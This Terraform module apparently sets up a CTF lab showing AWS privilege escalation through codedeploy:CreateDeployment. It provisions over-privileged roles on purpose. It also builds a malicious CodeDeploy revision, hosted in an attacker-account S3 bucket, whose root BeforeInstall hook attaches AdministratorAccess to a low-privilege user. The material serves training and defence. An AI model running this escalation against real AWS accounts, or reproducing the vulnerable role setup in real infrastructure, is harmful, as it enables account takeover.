# codedeploy-createdeployment privilege escalation scenario
#
# This scenario demonstrates how a principal with codedeploy:CreateDeployment
# (plus codedeploy:GetDeploymentConfig, codedeploy:RegisterApplicationRevision,
# and codedeploy:GetApplicationRevision) can escalate privileges by deploying a
# malicious revision to a pre-existing CodeDeploy deployment group. The revision's
# BeforeInstall lifecycle hook executes as the target EC2 instance's admin instance
# profile (AdministratorAccess), which in turn calls iam:AttachUserPolicy to grant
# AdministratorAccess to the starting IAM user.

# Resource naming convention: pl-prod-codedeploy-001-to-admin-{purpose}
# Victim account resources use provider = aws.prod
# Attacker bucket uses provider = aws.attacker

terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      version               = "~> 6.0"
      configuration_aliases = [aws.prod, aws.attacker]
    }
    archive = {
      source  = "hashicorp/archive"
      version = "~> 2.0"
    }
  }
}

locals {
  # Resolve attacker account ID: fall back to prod account_id when no separate
  # attacker account is configured (single-account mode).
  effective_attacker_account_id = var.attacker_account_id != "" ? var.attacker_account_id : var.account_id

  # appspec.yml for the malicious CodeDeploy revision.
  # The BeforeInstall hook runs escalate.sh as root using the EC2 instance profile.
  appspec_content = <<-APPSPEC
version: 0.0
os: linux
hooks:
  BeforeInstall:
    - location: scripts/escalate.sh
      timeout: 300
      runas: root
APPSPEC

  # Lifecycle hook script.
  # Reads the target IAM user name from SSM Parameter Store and attaches
  # AdministratorAccess to that user using the EC2 instance profile's
  # IAM credentials (AdministratorAccess).
  #
  # HCL heredoc interpolation note:
  #   ${...}  is evaluated by Terraform (interpolated)
  #   $VAR    is a literal bash variable reference — no escaping needed
  #   $()     is a literal bash command substitution — no escaping needed
  escalate_script_content = <<-SCRIPT
#!/bin/bash
set -e
REGION="${var.aws_region}"
TARGET_USER=$(aws ssm get-parameter \
  --name /pl/codedeploy-001/target-user \
  --region "$REGION" \
  --query Parameter.Value \
  --output text)
aws iam attach-user-policy \
  --user-name "$TARGET_USER" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --region "$REGION"
SCRIPT
}

# ─── Revision ZIP (built by archive provider) ─────────────────────────────────

data "archive_file" "revision" {
  type        = "zip"
  output_path = "${path.module}/codedeploy-001-revision.zip"

  source {
    content  = local.appspec_content
    filename = "appspec.yml"
  }

  source {
    content  = local.escalate_script_content
    filename = "scripts/escalate.sh"
  }
}

# ─── AMI data source ──────────────────────────────────────────────────────────

data "aws_ami" "al2023" {
  provider    = aws.prod
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["al2023-ami-2023.*-x86_64"]
  }

  filter {
    name   = "state"
    values = ["available"]
  }
}

# ─── Starting principal ───────────────────────────────────────────────────────

# Scenario-specific starting user.
# force_destroy = true lets Terraform clean up any policies, access keys,
# login profiles, or group memberships attached out-of-band by the demo script
# so that destroy still succeeds if the user disables the scenario without
# first running cleanup_attack.sh.
resource "aws_iam_user" "starting_user" {
  provider      = aws.prod
  force_destroy = true
  name          = "pl-prod-codedeploy-001-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "starting-user"
  }
}

resource "aws_iam_access_key" "starting_user" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

resource "aws_iam_user_policy" "starting_user_policy" {
  provider = aws.prod
  name     = "pl-prod-codedeploy-001-to-admin-starting-user-policy"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # The four CodeDeploy permissions required to trigger the escalation:
        #   CreateDeployment    — submit the malicious revision
        #   GetDeploymentConfig — look up the deployment config before submitting
        #   RegisterApplicationRevision — register the S3 revision location
        #   GetApplicationRevision      — verify the revision is registered
        Sid    = "RequiredForExploitationCodeDeploy"
        Effect = "Allow"
        Action = [
          "codedeploy:CreateDeployment",
          "codedeploy:GetDeploymentConfig",
          "codedeploy:RegisterApplicationRevision",
          "codedeploy:GetApplicationRevision",
        ]
        Resource = "*"
      },
      {
        # Helpful recon/monitoring permissions that make manual exploitation
        # easier but are not strictly required to create the deployment.
        Sid    = "HelpfulForReconAndMonitoring"
        Effect = "Allow"
        Action = [
          "codedeploy:GetDeployment",
          "codedeploy:ListDeployments",
          "codedeploy:GetDeploymentGroup",
          "codedeploy:GetApplication",
          "codedeploy:ListDeploymentInstances",
          "codedeploy:GetDeploymentInstance",
        ]
        Resource = "*"
      }
    ]
  })
}

# ─── EC2 admin instance profile (pre-existing privileged context) ─────────────

# IAM role attached to the target EC2 instance.
# AdministratorAccess gives the CodeDeploy lifecycle hook the IAM write access
# it needs to call iam:AttachUserPolicy on the starting user.
# force_detach_policies = true handles any out-of-band policy attachments.
resource "aws_iam_role" "ec2_role" {
  provider              = aws.prod
  force_detach_policies = true
  name                  = "pl-prod-codedeploy-001-to-admin-ec2-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-ec2-role"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "ec2-admin-instance-role"
  }
}

resource "aws_iam_role_policy_attachment" "ec2_role_admin" {
  provider   = aws.prod
  role       = aws_iam_role.ec2_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_iam_instance_profile" "ec2_profile" {
  provider = aws.prod
  name     = "pl-prod-codedeploy-001-to-admin-ec2-profile"
  role     = aws_iam_role.ec2_role.name
}

# ─── CodeDeploy service role ──────────────────────────────────────────────────

# CodeDeploy needs its own service role with AWSCodeDeployRole to enumerate
# EC2 instances in the deployment group via tag filters.
resource "aws_iam_role" "codedeploy_service_role" {
  provider              = aws.prod
  force_detach_policies = true
  name                  = "pl-prod-codedeploy-001-to-admin-deploy-svc-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "codedeploy.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-deploy-svc-role"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "codedeploy-service-role"
  }
}

resource "aws_iam_role_policy_attachment" "codedeploy_service_role_policy" {
  provider   = aws.prod
  role       = aws_iam_role.codedeploy_service_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSCodeDeployRole"
}

# ─── EC2 security group ───────────────────────────────────────────────────────

# No inbound access needed. All outbound is allowed so the instance can reach
# S3 (download revision), IAM, SSM, and the CodeDeploy endpoint APIs.
resource "aws_security_group" "ec2_sg" {
  provider    = aws.prod
  name        = "pl-prod-codedeploy-001-to-admin-sg"
  description = "CodeDeploy target EC2 - egress only"
  vpc_id      = var.vpc_id

  egress {
    description = "Allow all outbound so CodeDeploy agent can reach AWS APIs and S3"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-sg"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "ec2-security-group"
  }
}

# ─── Target EC2 instance ──────────────────────────────────────────────────────

# t3.micro running AL2023. user_data installs the CodeDeploy agent on first boot.
# The instance is tagged Name=pl-prod-codedeploy-001-to-admin-target so the
# CodeDeploy deployment group can identify it via the ec2_tag_filter.
resource "aws_instance" "target" {
  provider                    = aws.prod
  ami                         = data.aws_ami.al2023.id
  instance_type               = "t3.micro"
  subnet_id                   = var.subnet_id
  associate_public_ip_address = true
  iam_instance_profile        = aws_iam_instance_profile.ec2_profile.name
  vpc_security_group_ids      = [aws_security_group.ec2_sg.id]

  # Install the CodeDeploy agent using the region-specific S3 endpoint.
  # var.aws_region is interpolated by Terraform; the bash variable $REGION and
  # command substitution $() syntax are passed through literally.
  user_data = <<-EOF
    #!/bin/bash
    dnf install -y ruby wget
    cd /tmp
    wget -q https://aws-codedeploy-${var.aws_region}.s3.${var.aws_region}.amazonaws.com/latest/install
    chmod +x ./install
    ./install auto
    systemctl start codedeploy-agent
    systemctl enable codedeploy-agent
  EOF

  tags = {
    # This tag value is used by the ec2_tag_filter in the CodeDeploy deployment
    # group to match this specific instance.
    Name        = "pl-prod-codedeploy-001-to-admin-target"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "codedeploy-target-instance"
  }
}

# ─── CodeDeploy application and deployment group ──────────────────────────────

resource "aws_codedeploy_app" "app" {
  provider         = aws.prod
  name             = "pl-prod-codedeploy-001-to-admin-app"
  compute_platform = "Server"
}

# The deployment group targets instances tagged Name=pl-prod-codedeploy-001-to-admin-target.
# AllAtOnce deploys to all matched instances simultaneously.
# WITHOUT_TRAFFIC_CONTROL / IN_PLACE means no load balancer integration is needed.
resource "aws_codedeploy_deployment_group" "dg" {
  provider               = aws.prod
  app_name               = aws_codedeploy_app.app.name
  deployment_group_name  = "pl-prod-codedeploy-001-to-admin-dg"
  service_role_arn       = aws_iam_role.codedeploy_service_role.arn
  deployment_config_name = "CodeDeployDefault.AllAtOnce"

  ec2_tag_filter {
    key   = "Name"
    type  = "KEY_AND_VALUE"
    value = "pl-prod-codedeploy-001-to-admin-target"
  }

  deployment_style {
    deployment_option = "WITHOUT_TRAFFIC_CONTROL"
    deployment_type   = "IN_PLACE"
  }
}

# ─── SSM parameters ───────────────────────────────────────────────────────────

# Stores the starting user name so the hook script can look it up at runtime
# without needing to know the account ID or user ARN in advance.
resource "aws_ssm_parameter" "target_user" {
  provider    = aws.prod
  name        = "/pl/codedeploy-001/target-user"
  description = "Target IAM user name for the codedeploy-001 escalation hook"
  type        = "String"
  value       = aws_iam_user.starting_user.name

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-target-user"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "hook-target-lookup"
  }
}

# CTF flag stored in SSM Parameter Store. Retrieved by the attacker once they
# reach administrator-equivalent permissions via the elevated starting user.
# The hook attaches AdministratorAccess to the starting user; after that the
# starting user can call ssm:GetParameter on this path.
resource "aws_ssm_parameter" "flag" {
  provider    = aws.prod
  name        = "/pathfinding-labs/flags/codedeploy-001-to-admin"
  description = "CTF flag for the codedeploy-001-to-admin scenario"
  type        = "String"
  value       = var.flag_value

  tags = {
    Name        = "pl-prod-codedeploy-001-to-admin-flag"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "ctf-flag"
  }
}

# ─── Attacker S3 bucket (revision hosting) ────────────────────────────────────

# The attacker pre-stages the malicious revision ZIP in their own S3 bucket.
# CodeDeploy pulls the revision from this bucket using the EC2 instance's
# instance profile credentials — no attacker credentials are used at exploit time.
resource "aws_s3_bucket" "attacker_revision" {
  provider      = aws.attacker
  bucket        = "pl-attacker-codedeploy-001-revision-${local.effective_attacker_account_id}"
  force_destroy = true

  tags = {
    Name        = "pl-attacker-codedeploy-001-revision-${local.effective_attacker_account_id}"
    Environment = var.environment
    Scenario    = "codedeploy-createdeployment"
    Purpose     = "attacker-revision-bucket"
  }
}

resource "aws_s3_bucket_public_access_block" "attacker_revision_pab" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.attacker_revision.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Grants the victim account root read access to the revision object.
# The EC2 instance profile (AdministratorAccess) satisfies the bucket policy
# principal check when CodeDeploy downloads the revision at deployment time.
# A real attacker would grant account root because they would not know the
# exact instance profile ARN ahead of time.
resource "aws_s3_bucket_policy" "attacker_revision_policy" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.attacker_revision.id

  # Ensure the public access block is in place before writing the bucket policy
  # to avoid a race condition where the bucket policy API call is rejected.
  depends_on = [aws_s3_bucket_public_access_block.attacker_revision_pab]

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowVictimAccountReadRevision"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action   = ["s3:GetObject", "s3:GetObjectVersion"]
        Resource = "${aws_s3_bucket.attacker_revision.arn}/*"
      }
    ]
  })
}

# Upload the pre-built malicious revision ZIP to the attacker bucket.
# etag ensures Terraform re-uploads the object if the archive content changes.
resource "aws_s3_object" "revision" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.attacker_revision.id
  key      = "codedeploy-001-revision.zip"
  source   = data.archive_file.revision.output_path
  etag     = data.archive_file.revision.output_md5
}
